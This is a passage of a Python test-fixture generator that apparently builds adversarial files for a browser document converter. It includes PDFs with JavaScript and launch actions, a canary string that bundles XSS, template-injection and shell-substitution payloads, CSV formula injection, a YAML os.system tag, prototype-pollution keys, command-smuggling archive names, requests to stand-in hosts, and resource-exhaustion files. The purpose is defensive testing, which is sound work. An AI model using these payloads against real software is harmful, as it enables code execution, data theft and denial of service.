    package(first=("mimetype", b"application/epub+zip")),
    "A ZIP with a .drafter name whose first entry says it is an e-book. It is taken for what "
    "it says it is, which is not something Omsett converts yet.",
    "unregistered",
)
script(
    "package-named.zip",
    DRAFTER_SAMPLE,
    "A sound package with a .zip name. It is converted as the package it is, not unpacked.",
    "drafter", node="succeeds", mismatch=True,
)

# --- PDF ------------------------------------------------------------------------------------------
# A PDF can carry a program to run when it is opened, links that start programs, files attached
# inside it, and a password. Its pages are a tree that can point back at itself, and its
# streams are packed and can unpack to anything. And it can be "tagged" in a way that tells
# nothing, or that covers its pictures and none of its words. Each is converted to HTML.
G = "pdf"
NOT_PDF = "This file is not a valid PDF"
PDF_SAMPLE = sample("pdf/sample.pdf")
PDF_PLAIN = sample("pdf/untagged.pdf")
PDF_FONT = b"<< /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >>"


def pdf_of(objects, trailer=b""):
    """A PDF from numbered objects, with a true table of where each one is."""
    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
    offsets = {}
    for number in sorted(objects):
        offsets[number] = len(out)
        out += b"%d 0 obj\n" % number + objects[number] + b"\nendobj\n"
    size = max(objects) + 1
    start = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % size
    for number in range(1, size):
        out += (b"%010d 00000 n \n" % offsets[number]) if number in offsets else b"0000000000 65535 f \n"
    return bytes(out + b"trailer\n<< /Size %d /Root 1 0 R %s>>\nstartxref\n%d\n%%%%EOF\n" % (size, trailer, start))


def stream_of(data, extra=b""):
    return b"<< /Length %d %s>>\nstream\n" % (len(data), extra) + data + b"\nendstream"


WORDS = b"BT /F1 12 Tf 72 720 Td (An ordinary page of words, long enough to be a paragraph.) Tj ET\n"


def one_page(catalog=b"", page=b"", content=WORDS, more=None, trailer=b""):
    objects = {
        1: b"<< /Type /Catalog /Pages 2 0 R %s>>" % catalog,
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font %s >> /Contents 4 0 R %s>>" % (PDF_FONT, page),
        4: stream_of(content),
    }
    objects.update(more or {})
    return pdf_of(objects, trailer)


def pdf_trap(name, data, why, detect, **more):
    trap(name, data, why, detect, group=G, **more)


pdf_trap(
    "truncated.pdf",
    PDF_SAMPLE[: len(PDF_SAMPLE) // 3],
    "A PDF cut off a third of the way in. The table that says where its parts are is at the "
    "end, and the end is gone.",
    "pdf", node="fails", note=NOT_PDF,
)
pdf_trap(
    "runs-a-script-when-opened.pdf",
    one_page(catalog=b"/OpenAction << /S /JavaScript /JS (app.alert\\('opened'\\); this.submitForm\\('http://elsewhere.example/'\\);) >> /Names << /JavaScript << /Names [(a) << /S /JavaScript /JS (app.alert\\(2\\)) >>] >> >> "),
    "A PDF with a program to run the moment it is opened, and another kept by name. Nothing in "
    "a PDF is run, and neither is carried into the page.",
    "pdf", node="succeeds", absent="app.alert",
)
pdf_trap(
    "links-that-start-programs.pdf",
    one_page(
        page=b"/Annots [5 0 R 6 0 R 7 0 R] ",
        more={
            5: b"<< /Type /Annot /Subtype /Link /Rect [72 716 300 732] /A << /S /Launch /F (C:\\\\Windows\\\\System32\\\\cmd.exe) >> >>",
            6: b"<< /Type /Annot /Subtype /Link /Rect [72 700 300 716] /A << /S /URI /URI (javascript:alert\\(1\\)) >> >>",
            7: b"<< /Type /Annot /Subtype /Link /Rect [72 684 300 700] /A << /S /GoToR /F (\\\\\\\\elsewhere.example\\\\share\\\\x.pdf) >> >>",
        },
    ),
    "Three links: one that starts a program on the computer, one whose address is a script, "
    "and one that opens a file on another machine, which tells that machine who is asking.",
    "pdf", node="succeeds", absent="cmd.exe",
)
pdf_trap(
    "file-attached-inside.pdf",
    one_page(
        catalog=b"/Names << /EmbeddedFiles << /Names [(invoice.exe) 5 0 R] >> >> ",
        more={5: b"<< /Type /Filespec /F (invoice.exe) /EF << /F 6 0 R >> >>", 6: stream_of(b"MZ SECRET-ATTACHMENT")},
    ),
    "A PDF with another file attached inside it, here a program named like an invoice. "
    "Attachments are not read.",
    "pdf", node="succeeds", absent="SECRET-ATTACHMENT",
)
pdf_trap(
    "locked-with-a-password.pdf",
    one_page(trailer=b"/Encrypt << /Filter /Standard /V 1 /R 2 /O <%s> /U <%s> /P -64 >> /ID [<00112233445566778899aabbccddeeff> <00112233445566778899aabbccddeeff>] " % (b"ab" * 32, b"cd" * 32)),
    "A PDF that says it is locked with a password.",
    "pdf", node="fails", note="This PDF is protected by a password, which Omsett cannot open",
)
pdf_trap(
    "pictures-of-pages.pdf",
    one_page(content=b"0.5 g 72 100 468 620 re f\n"),
    "A page that is a picture and no words, as a scan is. There is nothing to read, and the "
    "reason is given.",
    "pdf", node="fails",
    note="This PDF has no text in it. It may be a scan: pictures of pages, which Omsett cannot read the words in yet",
)
pdf_trap(
    "claims-a-billion-pages.pdf",
    pdf_of({
        1: b"<< /Type /Catalog /Pages 2 0 R >>",
        2: b"<< /Type /Pages /Kids [3 0 R] /Count 1000000000 >>",
        3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font %s >> /Contents 4 0 R >>" % PDF_FONT,
        4: stream_of(WORDS),
    }),
    "One page, in a file that says it has a billion. The figure is not believed: the pages "
    "that are there are counted, and there is one.",
    "pdf", node="succeeds",
)
pdf_trap(
    "pages-inside-themselves.pdf",
    pdf_of({
        1: b"<< /Type /Catalog /Pages 2 0 R >>",
        2: b"<< /Type /Pages /Kids [2 0 R 3 0 R 2 0 R] /Count 3 >>",
        3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font %s >> /Contents 4 0 R >>" % PDF_FONT,
        4: stream_of(WORDS),
    }),
    "A list of pages that holds itself, twice. A reader that walks the list without noticing "
    "walks it for ever.",
    "pdf", node="fails", note=NOT_PDF,
)
pdf_trap(
    "tagged-for-its-pictures-only.pdf",
    one_page(
        catalog=b"/MarkInfo << /Marked true >> /StructTreeRoot 5 0 R ",
        page=b"/StructParents 0 ",
        content=b"/Figure << /MCID 0 >> BDC\n0.8 g 72 430 120 60 re f 0 g\nEMC\n" + WORDS,
        more={
            5: b"<< /Type /StructTreeRoot /K [6 0 R] /ParentTree 7 0 R >>",
            6: b"<< /Type /StructElem /S /Figure /P 5 0 R /Pg 3 0 R /K [0] /Alt (A chart) >>",
            7: b"<< /Nums [0 [6 0 R]] >>",
        },
    ),
    "A PDF that is tagged, but only for its picture: its words are in no tag. Read by its tags "
    "alone it would come out as the picture's description and nothing else. The tags are not "
    "believed, and the words are read from the page.",
    "pdf", node="succeeds", absent="[Picture: A chart]",
)
deep = {
    1: b"<< /Type /Catalog /Pages 2 0 R /MarkInfo << /Marked true >> /StructTreeRoot 5 0 R >>",
    2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
    3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font %s >> /Contents 4 0 R /StructParents 0 >>" % PDF_FONT,
    4: stream_of(b"/P << /MCID 0 >> BDC\n" + WORDS + b"EMC\n"),
    5: b"<< /Type /StructTreeRoot /K [10 0 R] /ParentTree 6 0 R >>",
    6: b"<< /Nums [0 [5009 0 R]] >>",
}
for i in range(5000):
    deep[10 + i] = b"<< /Type /StructElem /S /%s /P %d 0 R /Pg 3 0 R /K [%s] >>" % (b"P" if i == 4999 else b"Sect", 5 if i == 0 else 9 + i, b"0" if i == 4999 else b"%d 0 R" % (11 + i))
pdf_trap(
    "tags-five-thousand-deep.pdf",
    pdf_of(deep),
    "One paragraph inside five thousand sections, each inside the last. Tags nested past any "
    "that describe a document are not followed, and the words are read from the page.",
    "pdf", node="succeeds",
)
pdf_trap(
    "first-line-only.pdf",
    b"%PDF-1.7\n" + bytes(random.Random(11).randrange(256) for _ in range(4000)),
    "The line a PDF opens with, and four thousand bytes of noise.",
    "pdf", node="fails", note=NOT_PDF,
)
pdf_trap(
    "picture-named.pdf",
    GOOD,
    "A PNG with a .pdf name.",
    "png", node="succeeds", mismatch=True,
)
pdf_trap(
    "report-named.txt",
    PDF_PLAIN,
    "A sound PDF with a .txt name.",
    "pdf", node="succeeds", mismatch=True,
)

# --- code: the same payload, planted in every format ----------------------------------------------
# One adversarial payload, put wherever a format holds text. If any part of it ever ran, in the
# page, in the worker or in Node, it would leave a mark the tests look for after every trap:
#
#   a global named __omsett_canary;   a property on every object (prototype pollution);
#   a file at /tmp/omsett-canary;     a dialog;     a request to another site.
#
# Each of these files is also converted to every format its kind can become
# (fixtures/code-traps.test.ts), and no result may hold a live script.
G = "code"
MARK = "globalThis.__omsett_canary=1"
SHELL = "touch /tmp/omsett-canary"
CANARY = (
    '"><script>%s;alert("omsett-canary");fetch("http://canary.invalid/x")</script>'
    '<img src=x onerror="%s"><svg onload="%s"></svg><iframe src="javascript:%s"></iframe>'
    " ${%s} {{constructor.constructor('%s')()}} <%%= %s %%> #{%s}"
    " $(%s) `%s` ;%s; | %s && %s"
    " javascript:%s //"
) % ((MARK,) * 8 + (SHELL,) * 5 + (MARK,))
CB = CANARY.encode()
XML_CANARY = CANARY.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;").encode()


def code(name, data, why, detect, **more):
    trap(name, data, why, detect, group=G, **more)


WHY = "The adversarial payload %s. Nothing in it may run, here or in any format this becomes."
J = json.dumps(CANARY)

code("code.json", ('{"__proto__": {"polluted": true}, "constructor": {"prototype": {"polluted": true}}, "note": %s, %s: "as a name"}\n' % (J, J)).encode(),
     WHY % "as a value and as a name, beside names that mean something to JavaScript", "json", node="succeeds")
code("code.jsonl", ('{"__proto__": {"polluted": true}, "note": %s}\n{"note": "second line"}\n' % J).encode(),
     WHY % "in a line of JSON Lines", "jsonl", node="succeeds")
code("code.yaml", ("note: %s\nrun: !!js/function 'function(){%s}'\nshell: !!python/object/apply:os.system ['%s']\n__proto__:\n  polluted: true\n" % (J, MARK, SHELL)).encode(),
     WHY % "as a value, with two tags that ask the reader to build a function and to run a command", "yaml", node="succeeds")
code("code.toml", ('note = %s\n\n[__proto__]\npolluted = true\n' % J).encode(),
     WHY % "as a value, beside a table named __proto__", "toml", node="succeeds")
code("code.xml", b'<?xml version="1.0"?>\n<?xml-stylesheet href="javascript:' + MARK.encode() + b'"?>\n<notes><note onclick="' + XML_CANARY + b'">' + XML_CANARY + b"</note><script>" + MARK.encode() + b"</script></notes>\n",
     WHY % "as text and as an attribute, with a script tag and a stylesheet that is code", "xml", node="succeeds")
code("names-that-pollute.xml", b"<notes><__proto__><polluted>true</polluted></__proto__><constructor><prototype><polluted>true</polluted></prototype></constructor></notes>\n",
     "Tags named for the parts of JavaScript that every object shares. A reader that builds objects from tag names would change every object there is. The reader refuses the names.", "xml", node="fails", note="This file is not valid XML")
quoted = '"' + CANARY.replace('"', '""') + '"'
code("code.csv", ('name,note,__proto__\n%s,%s,polluted\n"=cmd|\' /C %s\'!A0","=WEBSERVICE(""http://canary.invalid/"")",x\n' % (quoted, quoted, SHELL)).encode(),
     WHY % "in cells, beside two formulas a spreadsheet would run", "csv", node="succeeds")
code("code.tsv", ("name\tnote\n%s\t%s\n" % (CANARY.replace("\t", " "), "second")).encode(),
     WHY % "in a cell", "tsv", node="succeeds")
esc = CANARY.replace("\\", "\\\\").replace(";", "\\;").replace(",", "\\,")
code("code.vcf", ("BEGIN:VCARD\r\nVERSION:3.0\r\nFN:%s\r\nEMAIL:%s\r\nNOTE:%s\r\nEND:VCARD\r\n" % (esc, esc, esc)).encode(),
     WHY % "as a contact's name, address and note", "vcf", node="succeeds")
code("code.ics", ("BEGIN:VCALENDAR\r\nVERSION:2.0\r\nBEGIN:VEVENT\r\nUID:1\r\nDTSTART:20261123T090000Z\r\nSUMMARY:%s\r\nLOCATION:%s\r\nDESCRIPTION:%s\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n" % (esc, esc, esc)).encode(),
     WHY % "as an event's title, place and description", "ics", node="succeeds")
code("code.xlsx", book({"xl/worksheets/sheet2.xml": sheet('<row r="1">' + text_cell("A1", "name") + text_cell("B1", "__proto__") + '</row><row r="2">' + text_cell("A2", XML_CANARY.decode()) + text_cell("B2", "polluted") + '<c r="C2"><f>' + XML_CANARY.decode() + "</f><v>0</v></c></row>")}),
     WHY % "in a cell and in a formula, beside a column named __proto__", "xlsx", node="succeeds")

one_line = CANARY.replace("-->", "- ->")
code("code.srt", ("1\n00:00:01,000 --> 00:00:04,000\n%s\n" % one_line).encode(), WHY % "as a subtitle", "srt", node="succeeds", absent="<script")
code("code.vtt", ("WEBVTT\n\n00:00:01.000 --> 00:00:04.000\n%s\n" % one_line).encode(), WHY % "as a subtitle", "vtt", node="succeeds", absent="<script")
code("code.ass", ASS_HEAD + b"Dialogue: 0,0:00:01.00,0:00:04.00,Default,,0,0,0,," + one_line.encode() + b"\n", WHY % "as a line of dialogue", "ass", node="succeeds", absent="<script")
code("code.ssa", SSA_HEAD + b"Dialogue: Marked=0,0:00:01.00,0:00:04.00,Default,,0,0,0,," + one_line.encode() + b"\n", WHY % "as a line of dialogue", "ssa", node="succeeds", absent="<script")
code("code.sbv", ("0:00:01.000,0:00:04.000\n%s\n" % one_line).encode(), WHY % "as a caption", "sbv", node="succeeds", absent="<script")
code("code.lrc", ("[00:01.00]%s\n[00:04.00]\n" % one_line).encode(), WHY % "as a line of lyrics", "lrc", node="succeeds", absent="<script")
TTML_HEAD = b'<?xml version="1.0" encoding="UTF-8"?>\n<tt xmlns="http://www.w3.org/ns/ttml">\n<body><div>\n'
code("code.ttml", TTML_HEAD + b'<p begin="1s" end="4s" onclick="' + XML_CANARY + b'">' + XML_CANARY + b"</p>\n</div></body>\n</tt>\n", WHY % "as a subtitle and as an attribute", "ttml", node="succeeds", absent="<script")
code("code.smi", b"<SAMI>\n<BODY>\n<SYNC Start=1000><P Class=ENCC>" + CB + b"\n<SYNC Start=4000><P Class=ENCC>&nbsp;\n</BODY>\n</SAMI>\n", WHY % "as a caption, in a format written like a web page", "smi", node="succeeds", absent="<script")
code("code.sub", ("{25}{100}%s\n" % one_line.replace("|", "/")).encode(), WHY % "as a subtitle", "microdvd", node="succeeds", absent="<script")

code("code.md", ("# %s\n\n%s\n\n[a link](javascript:%s) ![a picture](javascript:%s)\n\n```\n%s\n```\n" % (CANARY, CANARY, MARK, MARK, CANARY)).encode(),
     WHY % "as a heading, a paragraph, a link, a picture and a block of code", "md", node="succeeds", absent="<script")
code("code.html", b"<!doctype html>\n<html><head><title>" + CB + b"</title><script>" + MARK.encode() + b"</script></head><body onload=\"" + MARK.encode() + b"\"><h1>Title</h1><p>" + CB + b'</p><a href="javascript:' + MARK.encode() + b'">link</a><p>' + XML_CANARY + b"</p></body></html>\n",
     WHY % "as markup that is live, and again as text", "html", node="succeeds", absent="<script>" + MARK)
code("code.docx", doc({"word/document.xml": body_of(words(XML_CANARY.decode()) + '<w:p><w:hyperlink r:id="rId4"><w:r><w:t>a link</w:t></w:r></w:hyperlink></w:p>'),
                       "word/_rels/document.xml.rels": RELS.replace(b"https://omsett.com", b"javascript:" + MARK.encode())}),
     WHY % "as a paragraph, with a link whose address is a script", "docx", node="succeeds", absent="<script>" + MARK)
code("code.pptx", deck({"ppt/slides/slide1.xml": FIRST.replace(b"Omsett", XML_CANARY, 1),
                        "ppt/slides/_rels/slide2.xml.rels": DECK["ppt/slides/_rels/slide2.xml.rels"].replace(b"https://omsett.com", b"javascript:" + MARK.encode())}),
     WHY % "as a slide's title, with a link whose address is a script", "pptx", node="succeeds", absent="<script>" + MARK)
pdf_text = CANARY.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)").encode("latin-1")
code("code.pdf", one_page(catalog=b"/OpenAction << /S /JavaScript /JS (" + MARK.encode() + b") >> ", content=b"BT /F1 9 Tf 20 720 Td (" + pdf_text + b") Tj ET\n" + WORDS.replace(b"720", b"700")),
     WHY % "as words on the page, with a program to run on opening", "pdf", node="succeeds", absent="<script>" + MARK)

code("code.fountain", ("Title: %s\n\nINT. ROOM - DAY\n\n%s\n\nADA\n%s\n" % (one_line, CANARY, one_line)).encode(), WHY % "as the title, a line of action and a line of dialogue", "fountain", node="succeeds")
code("code.fdx", b'<?xml version="1.0"?>\n<FinalDraft><Content><Paragraph Type="Action" onclick="' + XML_CANARY + b'"><Text>' + XML_CANARY + b"</Text></Paragraph><script>" + MARK.encode() + b"</script></Content></FinalDraft>\n",
     WHY % "as a line of action and as an attribute, with a script tag", "fdx", node="succeeds")
code("code.drafter", package({"title": CANARY, "__proto__": {"polluted": True}, "constructor": {"prototype": {"polluted": True}}}, files={"Omsett.fountain": ("INT. ROOM - DAY\n\n%s\n" % CANARY).encode()}),
     WHY % "in the script and in the manifest, beside names that mean something to JavaScript", "drafter", node="succeeds")

svg_code = b'<svg xmlns="http://www.w3.org/2000/svg" width="64" height="40" onload="' + XML_CANARY + b'"><script>' + MARK.encode() + b';alert(1)</script><rect width="64" height="40" fill="#3b6cff"/><text x="2" y="20" font-size="6">' + XML_CANARY + b'</text><a href="javascript:' + MARK.encode() + b'"><rect width="9" height="9"/></a><foreignObject width="9" height="9"><body xmlns="http://www.w3.org/1999/xhtml" onload="' + XML_CANARY + b'"/></foreignObject></svg>\n'
code("code.svg", svg_code, WHY % "as a script, as handlers, as a link, and as text", "svg", node="succeeds", absent="omsett_canary")
JPEG_SAMPLE = sample("jpeg/sample.jpg")
code("code.jpg", JPEG_SAMPLE[:2] + b"\xff\xfe" + struct.pack(">H", len(CB) + 2) + CB + JPEG_SAMPLE[2:],
     WHY % "in the comment a JPEG may carry", "jpeg", node="succeeds", absent="omsett_canary")
GIF_SAMPLE = sample("gif/sample.gif")
code("code.gif", GIF_SAMPLE[:-1] + b"\x21\xfe" + bytes([len(CB[:250])]) + CB[:250] + b"\x00" + GIF_SAMPLE[-1:],
     WHY % "in the comment a GIF may carry", "gif", node="succeeds", absent="omsett_canary")
code("code.ttf", sfnt([(tag, data + CB if tag == b"name" else data) for tag, data in TT]),
     WHY % "in the table that holds a font's name. A font is carried across table by table, so it is still there afterwards, as bytes that nothing reads as code", "ttf", node="succeeds")

# Written with ${IFS} for the space: a folder name that ends in a space is refused for being one.
SHELL_NAME = SHELL.replace(" ", "${IFS}").encode()
names = [b"$(%s).txt" % SHELL_NAME, b"`%s`.txt" % SHELL_NAME, b";%s;.sh" % SHELL_NAME, b"__proto__", b"constructor", b"<img src=x onerror=alert(1)>.html", b"run.sh", b"index.html"]
members = [{"name": n, "data": CB, "mode": 0o100755} for n in names]
code("code.zip", zip_of(members, comment=CB[:200]), WHY % "as the contents of every file, with files named as commands, as markup, and as names that mean something to JavaScript, all marked as programs", "zip", node="succeeds")
code("code.tar", tar_of(*[(tar_header(n[:99], len(CB), mode=0o755), CB) for n in names]), WHY % "as the contents of every file, with files named as commands and marked as programs", "tar", node="succeeds")
code("code.tar.gz", gz(tar_of(*[(tar_header(n[:99], len(CB), mode=0o755), CB) for n in names])), WHY % "the same, squeezed", "tgz", node="succeeds")


# --- Found by the audit of 23 November 2026 ------------------------------------------------------
# Each of these got through, or cost far more than its size, until that audit. They are filed
# with the traps of their own kind.

HIDING_STYLES = ('<?xml version="1.0"?><w:styles %s>'
    '<w:style w:type="character" w:styleId="Secret"><w:name w:val="Secret"/><w:rPr><w:vanish/></w:rPr></w:style>'
    '<w:style w:type="character" w:styleId="SecretToo"><w:name w:val="SecretToo"/><w:basedOn w:val="Secret"/></w:style>'
    '<w:style w:type="paragraph" w:styleId="HiddenPara"><w:name w:val="HiddenPara"/><w:rPr><w:vanish/></w:rPr></w:style>'
    '</w:styles>' % WNS).encode()
trap(
    "hidden-every-other-way.docx",
    doc({"word/styles.xml": HIDING_STYLES, "word/document.xml": body_of(
        '<w:p><w:r><w:t xml:space="preserve">What the document says. </w:t></w:r><w:r><w:rPr><w:rStyle w:val="Secret"/></w:rPr><w:t>SECRET-BY-STYLE</w:t></w:r>'
        '<w:r><w:rPr><w:rStyle w:val="SecretToo"/></w:rPr><w:t>SECRET-BY-A-STYLE-BASED-ON-IT</w:t></w:r></w:p>'
        '<w:p><w:pPr><w:pStyle w:val="HiddenPara"/></w:pPr><w:r><w:t>SECRET-PARAGRAPH</w:t></w:r></w:p>'
        '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> SET price "9" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>'
        '<w:r><w:t>SECRET-FIELD</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r><w:r><w:t>And after the field.</w:t></w:r></w:p>'
        '<w:p><w:fldSimple w:instr=" SET other &quot;x&quot; "><w:r><w:t>SECRET-SIMPLE-FIELD</w:t></w:r></w:fldSimple></w:p>'
        '<w:tbl><w:tr><w:tc><w:p><w:r><w:t>A row that is shown</w:t></w:r></w:p></w:tc></w:tr>'
        '<w:tr><w:trPr><w:del w:id="5" w:author="a"/></w:trPr><w:tc><w:p><w:r><w:t>SECRET-DELETED-ROW</w:t></w:r></w:p></w:tc></w:tr>'
        '<w:tr><w:trPr><w:hidden/></w:trPr><w:tc><w:p><w:r><w:t>SECRET-HIDDEN-ROW</w:t></w:r></w:p></w:tc></w:tr></w:tbl>'
    )}),
    "Words hidden in every way but the plain one: by the style they are given, by a style based on that one, by their "
    "paragraph's style, as the stored result of a field that shows nothing, and in table rows deleted or marked hidden. None is carried across.",
    "docx", group="documents", node="succeeds", absent="SECRET-",
)
trap(
    "two-million-empty-paragraphs.docx",
    doc({"word/document.xml": body_of(words("x") + "<w:p/>" * 2_000_000)}),
    "Two million paragraphs with nothing in them: twelve megabytes of tags, 18 KB as a file, and over a gigabyte once read. The tags are counted before any is read.",
    "docx", group="documents", node="fails", note="This document is too large to convert in a browser",
)
HIDDEN_SHAPE = b'<p:sp><p:nvSpPr><p:cNvPr id="99" name="Hidden" hidden="1"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:txBody><a:bodyPr/><a:p><a:r><a:t>SECRET-HIDDEN-SHAPE</a:t></a:r></a:p></p:txBody></p:sp></p:spTree>'
trap(
    "hidden-spelled-another-way.pptx",
    deck({
        "ppt/slides/slide2.xml": DECK["ppt/slides/slide2.xml"].replace(b"<p:sld ", b'<p:sld show="false" ', 1).replace(b"</p:spTree>", b'<p:sp><p:nvSpPr><p:cNvPr id="98" name="x"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:txBody><a:bodyPr/><a:p><a:r><a:t>SECRET-HIDDEN-SLIDE</a:t></a:r></a:p></p:txBody></p:sp></p:spTree>', 1),
        "ppt/slides/slide1.xml": FIRST.replace(b"</p:spTree>", HIDDEN_SHAPE, 1),
    }),
    'A slide hidden with the word "false" where most files write "0", and a text box hidden in the editor on a slide that is shown. Neither was shown to the audience, and neither is carried across.',
    "pptx", group="slides", node="succeeds", absent="SECRET-",
)
trap(
    "ten-million-empty-rows.xlsx",
    book({"xl/worksheets/sheet2.xml": sheet("<row/>" * 10_000_000 + '<row r="1">' + text_cell("A1", "x") + '</row><row r="2">' + text_cell("A2", "y") + "</row>")}),
    "Ten million rows with nothing in them: sixty megabytes of tags, under 100 KB as a file, and three gigabytes once read. Empty rows are counted like any others, before any is read.",
    "xlsx", group="workbooks", node="fails", note=BOOK_TOO_BIG,
)
trap(
    "tag-left-behind.srt",
    b"1\n00:00:01,000 --> 00:00:02,000\n<<b>img src=x onerror=alert(1)>\n\n2\n00:00:03,000 --> 00:00:04,000\nhello\n\n<{\\x}script>alert(1)<{\\x}/script>\n",
    "A tag written inside another, so that taking the inner one out leaves the outer one whole; and a tag broken up by a position code, after a blank line. Tags are taken out until none is left.",
    "srt", group="subtitles", node="succeeds", absent="<img",
)
trap(
    "tag-spelled-in-entities.vtt",
    b"WEBVTT\n\n00:01.000 --> 00:02.000\n&lt;&lt;b&gt;script&gt;alert(1)&lt;&lt;b&gt;/script&gt;\n",
    "A script tag spelled out in escapes, with another tag inside it: unescaped and stripped once, it is a script tag. It is stripped until it is not.",
    "vtt", group="subtitles", node="succeeds", absent="<script",
)
trap(
    "words-after-eighty-thousand-blank-lines.srt",
    b"1\n00:00:01,000 --> 00:00:02,000\nhi\n\n" + b"x\n\n" * 80_000,
    "One subtitle whose words go on after a blank line eighty thousand times. Each piece is added once, not re-read with all that came before.",
    "srt", group="subtitles", node="succeeds",
)
_big = max(TT, key=lambda t: len(t[1]))
_font = bytearray(sfnt(TT + [(b"zz%02d" % i, _big[1]) for i in range(40)]))
_count = struct.unpack(">H", _font[4:6])[0]
_where = {bytes(_font[12 + 16 * i : 16 + 16 * i]): 12 + 16 * i for i in range(_count)}
_home = _font[_where[_big[0]] + 8 : _where[_big[0]] + 12]
for _tag, _at in _where.items():
    if _tag.startswith(b"zz"):
        _font[_at + 8 : _at + 12] = _home
trap(
    "tables-that-share-their-bytes.ttf",
    bytes(_font),
    "A font with forty extra tables that all point at the same bytes as its largest. Read, it is one font; written out with each table given its own copy, it is forty times the size.",
    "ttf", group="fonts", node="fails", note=NOT_FONT % "TTF",
)
ALIKE = "This archive holds two files whose names differ only in capitals or accents. On many computers one would overwrite the other"
UNKEEPABLE = "This archive holds a file with a name Windows cannot keep safely: a device name such as NUL, a name ending in a dot or a space, or one with a colon in it"
trap("names-differ-only-in-capitals.zip", zip_of([{"name": b"Readme.txt", "data": b"the one that is checked\n"}, {"name": b"README.TXT", "data": b"the one that is kept\n"}]),
     "Two files whose names differ only in capitals. On a Windows or Mac disk they are one file, and the second replaces the first.", "zip", group="archives", node="fails", note=ALIKE)
trap("names-differ-only-in-accents.zip", zip_of([{"name": "café.txt".encode(), "data": b"one\n"}, {"name": "café.txt".encode(), "data": b"two\n"}]),
     "Two files with one name, its accent written two ways. They look the same and, on a Mac, are the same.", "zip", group="archives", node="fails", note=ALIKE)
trap("named-for-a-device.zip", zip_of([{"name": b"notes.txt", "data": b"x\n"}, {"name": b"NUL.txt", "data": b"x\n"}]),
     "A file named NUL.txt. On Windows that is not a file but the device that swallows whatever is written to it.", "zip", group="archives", node="fails", note=UNKEEPABLE)
trap("a-second-stream.tar", tar_of((tar_header(b"notes.txt:hidden.exe", 2), b"x\n")),
     "A name with a colon in it. On Windows this writes a hidden second stream of notes.txt, which no folder listing shows.", "tar", group="archives", node="fails", note=UNKEEPABLE)
trap("a-file-that-is-also-a-folder.zip", zip_of([{"name": b"dir", "data": b"x\n"}, {"name": b"dir/inside.txt", "data": b"x\n"}]),
     "A file called dir, and a file inside a folder called dir. It cannot be both.", "zip", group="archives", node="fails", note="This file is not a valid ZIP archive")
_pax = b"0" * 80_000 + b"3 x"
trap("length-of-eighty-thousand-zeros.tar", tar_of((tar_header(b"PaxHeader", len(_pax), kind=b"x"), _pax), (tar_header(b"a.txt", 2), b"hi")),
     "An extended header whose record gives its length as eighty thousand zeros and a three. Read as a number that is three, and the reader would start again three characters on, eighty thousand digits at a time.", "tar", group="archives", node="succeeds")
trap("brackets-never-closed.fountain", b"\n" + b"(" * 80_000 + b"\nsay\n\nx" + b" " * 80_000 + b"x\n",
     "Eighty thousand opening brackets and not one closing, and a line of eighty thousand spaces between two letters. Each was searched again from every character in it.", "fountain", group="scripts", node="succeeds")
trap("type-is-constructor.fdx", b'<?xml version="1.0"?>\n<FinalDraft DocumentType="Script" Version="5"><Content><Paragraph Type="Action"><Text>Seen.</Text></Paragraph><Paragraph Type="constructor"><Text>Also seen.</Text></Paragraph><Paragraph Type="__proto__"><Text>And this.</Text></Paragraph></Content></FinalDraft>\n',
     "Paragraphs whose kind is given as \"constructor\" and \"__proto__\", names every JavaScript object answers to. They are lines of action like any other of unknown kind, and are kept.", "fdx", group="scripts", node="succeeds")
trap("soft-breaks-eighty-thousand-times.vcf", b"BEGIN:VCARD\r\nVERSION:2.1\r\nFN:Ada\r\nNOTE;ENCODING=QUOTED-PRINTABLE:" + b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=\r\n" * 80_000 + b"z\r\nEND:VCARD\r\n",
     "A note continued onto the next line eighty thousand times, the old way. The pieces are joined once, not copied for every line.", "vcf", group="contacts", node="succeeds")
trap("html-a-thousand-deep.md", b"# Title\n\n" + b"<div>" * 1000 + b"x" + b"</div>" * 1000 + b"\n",
     "Markdown holding HTML nested a thousand deep. The depth of the Markdown is checked before its HTML is read; now the HTML's is too.", "md", group="text", node="fails", note=TOO_DEEP)
trap("long-and-flat.html", b"<!doctype html><title>Long</title><h1>Long</h1>" + b"<p>a</p>" * 130_000,
     "A hundred and thirty thousand paragraphs, none inside another. It is long, not deep, and converts.", "html", group="text", node="succeeds")


import base64 as _b64


def big_png(width, height):
    """A sound one-bit PNG of any size, in a few kilobytes."""
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, 1, 0, 0, 0, 0)) + chunk(b"IDAT", zlib.compress(bytes((width + 7) // 8 + 1) * height, 9)) + chunk(b"IEND", b"")


def svg_of(body, width=100, height=100):
    return ('<svg xmlns="http://www.w3.org/2000/svg" width="%d" height="%d">%s</svg>\n' % (width, height, body)).encode()


COSTLY = "This drawing asks for more work than Omsett will do to draw it"
INSIDE = "This drawing holds a picture too large to convert in a browser"
trap("picture-inside-is-huge.svg", svg_of('<image width="100" height="100" href="data:image/png;base64,%s"/>' % _b64.b64encode(big_png(20000, 20000)).decode()),
     "A drawing of 100 by 100 pixels that carries a picture of 20,000 by 20,000 inside it. The drawing's own size is honest, and says nothing of what it will cost to draw.",
     "svg", group="size", node="fails", note=INSIDE)
